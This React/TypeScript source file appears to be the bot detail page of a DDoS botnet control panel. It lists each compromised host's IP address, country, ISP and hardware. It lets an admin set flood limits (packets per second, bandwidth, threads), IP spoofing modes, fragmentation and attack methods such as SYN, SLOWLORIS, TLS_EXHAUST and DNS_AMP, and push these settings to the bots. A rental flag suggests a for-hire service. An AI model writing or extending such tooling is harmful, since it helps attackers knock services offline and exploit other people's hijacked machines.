import React, { useEffect, useState } from 'react';
import { api } from '../utils/api';
import { ArrowLeft, Save, Cpu, HardDrive, Wifi, Globe, Clock, Shield } from 'lucide-react';
import { useToast } from '../components/Toast';

interface Bot {
  id: string; bot_identifier: string; nickname: string | null;
  ip_address: string | null; country: string | null; isp: string | null;
  os_name: string | null; cpu_cores: number; ram_total_mb: number;
  net_speed_mbps: number; status: string; is_rented: boolean;
  max_pps: number; max_mbps: number; max_threads: number;
  enabled_methods: string[]; spoof_mode: number; fragmentation: boolean;
  last_heartbeat_at: string | null; first_seen_at: string | null; bot_version: string;
}

export default function BotDetail({ botId, onBack, role = 'user' }: { botId: string; onBack: () => void; role?: 'admin' | 'user' }) {
  const { toast } = useToast();
  const [bot, setBot] = useState<Bot | null>(null);
  const [th, setTh] = useState({
    max_pps: 100000, max_mbps: 500, max_threads: 100,
    enabled_methods: ['UDP'] as string[], spoof_mode: 0, fragmentation: false,
  });
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    api.get(`/api/bots/${botId}`)
      .then(r => {
        setBot(r.data);
        setTh({
          max_pps: r.data.max_pps,
          max_mbps: r.data.max_mbps,
          max_threads: r.data.max_threads,
          enabled_methods: r.data.enabled_methods || ['UDP'],
          spoof_mode: r.data.spoof_mode ?? 0,
          fragmentation: !!r.data.fragmentation,
        });
      })
      .catch(() => toast('Failed to load bot', 'error'));
  }, [botId, toast]);

  const save = async () => {
    setSaving(true);
    try {
      await api.patch(`/api/bots/${botId}/throttle`, th);
      toast('Throttle saved & pushed to bot', 'success');
    } catch {
      toast('Save failed', 'error');
    }
    setSaving(false);
  };

  const tm = (m: string) => setTh(t => ({
    ...t,
    enabled_methods: t.enabled_methods.includes(m)
      ? t.enabled_methods.filter(x => x !== m)
      : [...t.enabled_methods, m],
  }));

  if (!bot) {
    return (
      <div className="p-8">
        <div className="skeleton h-8 w-48 mb-6" />
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          {[...Array(8)].map((_, i) => <div key={i} className="skeleton h-24 rounded-xl" />)}
        </div>
      </div>
    );
  }

  return (
    <div className="p-6 md:p-8 max-w-5xl animate-fade-in">
      <button onClick={onBack} className="flex items-center gap-2 text-xs text-[var(--text-muted)] hover:text-[var(--text-primary)] mb-6 transition-colors">
        <ArrowLeft className="w-3.5 h-3.5" />Back to Bots
      </button>

      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8">
        <div>
          <h2 className="text-xl md:text-2xl font-bold font-mono break-all">{bot.bot_identifier}</h2>
          <p className="text-xs text-[var(--text-muted)] mt-1">{bot.nickname || 'Unnamed'} · v{bot.bot_version || '?'}</p>
        </div>
        <span className={`self-start px-3 py-1 rounded-full text-[10px] font-semibold uppercase tracking-wider border ${
          bot.status === 'online'
            ? 'bg-emerald-600/10 text-emerald-400 border-emerald-600/20'
            : 'bg-gray-600/10 text-gray-500 border-gray-600/20'
        }`}>{bot.status}</span>
      </div>

      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 mb-8">
        {[
          { icon: Globe, label: 'IP Address', value: bot.ip_address || 'Unknown' },
          { icon: Globe, label: 'Country / ISP', value: `${bot.country || '?'} / ${bot.isp || '?'}` },
          { icon: Cpu, label: 'Operating System', value: bot.os_name || 'Unknown' },
          { icon: Cpu, label: 'CPU Cores', value: String(bot.cpu_cores ?? '—') },
          { icon: HardDrive, label: 'RAM', value: `${bot.ram_total_mb ?? '—'} MB` },
          { icon: Wifi, label: 'Network Speed', value: `${bot.net_speed_mbps ?? '—'} Mbps` },
          { icon: Clock, label: 'First Seen', value: bot.first_seen_at ? new Date(bot.first_seen_at).toLocaleString() : 'N/A' },
          { icon: Clock, label: 'Last Heartbeat', value: bot.last_heartbeat_at ? new Date(bot.last_heartbeat_at).toLocaleString() : 'Never' },
        ].map(({ icon: Icon, label, value }) => (
          <div key={label} className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-xl p-4 hover:border-[var(--border-light)] transition-colors">
            <Icon className="w-4 h-4 text-[var(--text-muted)] mb-2" />
            <div className="text-[10px] font-semibold text-[var(--text-muted)] uppercase tracking-[0.08em] mb-1">{label}</div>
            <div className="text-xs font-mono text-[var(--text-primary)] truncate" title={value}>{value}</div>
          </div>
        ))}
      </div>

      {role === 'admin' && <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl p-6">
        <h3 className="text-sm font-semibold mb-6 flex items-center gap-2">
          <Shield className="w-4 h-4 text-emerald-400" />Throttle Configuration
        </h3>
        <div className="space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {[
              { label: 'Max PPS', key: 'max_pps' as const, min: 1000, max: 5000000, step: 1000 },
              { label: 'Max Mbps', key: 'max_mbps' as const, min: 10, max: 10000, step: 10 },
              { label: 'Max Threads', key: 'max_threads' as const, min: 1, max: 1000, step: 1 },
            ].map(({ label, key, min, max, step }) => (
              <div key={key}>
                <div className="flex justify-between mb-2">
                  <label className="text-xs text-[var(--text-secondary)]">{label}</label>
                  <span className="text-xs font-mono text-emerald-400 font-semibold tabular-nums">{th[key].toLocaleString()}</span>
                </div>
                <input type="range" min={min} max={max} step={step} value={th[key]} onChange={e => setTh(t => ({ ...t, [key]: parseInt(e.target.value) }))} className="w-full" />
              </div>
            ))}
          </div>

          <div className="flex flex-wrap gap-6">
            <div>
              <label className="text-xs text-[var(--text-secondary)] block mb-2">Spoof Mode</label>
              <select
                className="bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2 text-xs text-[var(--text-primary)] focus:outline-none focus:border-emerald-600"
                value={th.spoof_mode}
                onChange={e => setTh(t => ({ ...t, spoof_mode: parseInt(e.target.value) }))}
              >
                <option value={0}>Off</option>
                <option value={1}>VN IP Spoof</option>
                <option value={2}>Random Spoof</option>
              </select>
            </div>
            <div className="flex items-end pb-2">
              <label className="flex items-center gap-2 text-xs text-[var(--text-secondary)] cursor-pointer select-none">
                <input type="checkbox" checked={th.fragmentation} onChange={e => setTh(t => ({ ...t, fragmentation: e.target.checked }))} />
                Enable Fragmentation
              </label>
            </div>
          </div>

          <div>
            <label className="text-xs text-[var(--text-secondary)] block mb-2">Allowed Methods</label>
            <div className="flex flex-wrap gap-1.5">
              {['UDP','TCP','HTTP','SYN','ICMP','MIX','SLOWLORIS','TLS_EXHAUST','DNS_AMP','GAME_MIMIC','MEGA'].map(m => (
                <button
                  key={m}
                  type="button"
                  onClick={() => tm(m)}
                  className={`px-3 py-1.5 rounded-lg text-[10px] font-medium transition-all ${
                    th.enabled_methods.includes(m)
                      ? 'bg-emerald-600/10 text-emerald-400 border border-emerald-600/20'
                      : 'bg-[var(--bg-primary)] text-[var(--text-muted)] border border-[var(--border)] hover:border-[var(--border-light)]'
                  }`}
                >{m}</button>
              ))}
            </div>
          </div>

          <button
            onClick={save}
            disabled={saving}
            className="flex items-center gap-2 px-6 py-2.5 bg-emerald-600 hover:bg-emerald-700 disabled:opacity-50 rounded-xl text-xs font-semibold transition-colors"
          >
            <Save className="w-3.5 h-3.5" />{saving ? 'Saving…' : 'Save Changes'}
          </button>
        </div>
      </div>}
    </div>
  );
}
